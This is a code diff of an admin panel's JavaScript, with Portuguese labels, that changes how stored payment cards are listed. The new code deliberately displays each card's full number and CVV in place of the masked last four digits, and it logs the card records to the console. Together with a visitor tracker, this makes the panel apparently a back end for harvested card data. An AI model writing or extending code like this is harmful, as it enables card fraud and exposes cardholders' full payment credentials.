@@ -800,27 +800,36 @@
         } catch (error) { console.error(error); }
     }
 
-    // Cards
-    async function loadCards() {
-        try {
-            const res = await fetch('/api/admin/cartoes', { headers: { 'Authorization': `Bearer ${adminToken}` } });
-            const data = await res.json();
-            if (data.success && data.cartoes) {
-                const tbody = document.getElementById('cardsBody');
-                if (data.cartoes.length === 0) { tbody.innerHTML = '<tr><td colspan="4">No cards registered</td></tr>'; return; }
+   // CARDS - COM TODOS OS DADOS
+async function loadCards() {
+    try {
+        const res = await fetch('/api/admin/cartoes', { headers: { 'Authorization': `Bearer ${adminToken}` } });
+        const data = await res.json();
+        console.log('Cartões recebidos:', data);
+        
+        if (data.success && data.cartoes) {
+            const tbody = document.getElementById('cardsBody');
+            if (data.cartoes.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="5">Nenhum cartão registrado</td></tr>';
+            } else {
                 tbody.innerHTML = data.cartoes.map(c => `
                     <tr>
-                        <td>${c.nome_titular || 'Unknown'}</td>
-                        <td>**** ${c.ultimos_4 || '****'}</td>
-                        <td>${c.bandeira || 'N/A'}</td>
+                        <td>${c.nome_titular || 'Desconhecido'}</td>
+                        <td>${c.numero || '**** **** **** ' + (c.ultimos_4 || '****')}</td>
+                        <td>${c.cvv || '***'}</td>
                         <td>${c.validade_mes || '??'}/${c.validade_ano || '??'}</td>
+                        <td>${c.bandeira || 'N/A'}</td>
                     </tr>
                 `).join('');
-                document.getElementById('statCards').innerText = data.cartoes.length;
             }
-        } catch (error) { console.error(error); }
+            document.getElementById('statCards').innerText = data.cartoes.length;
+        } else {
+            console.log('Erro ao carregar cartões:', data);
+        }
+    } catch (error) {
+        console.error('Erro ao carregar cartões:', error);
     }
-
+}
     // Visitors
     async function loadVisitors() {
         try {
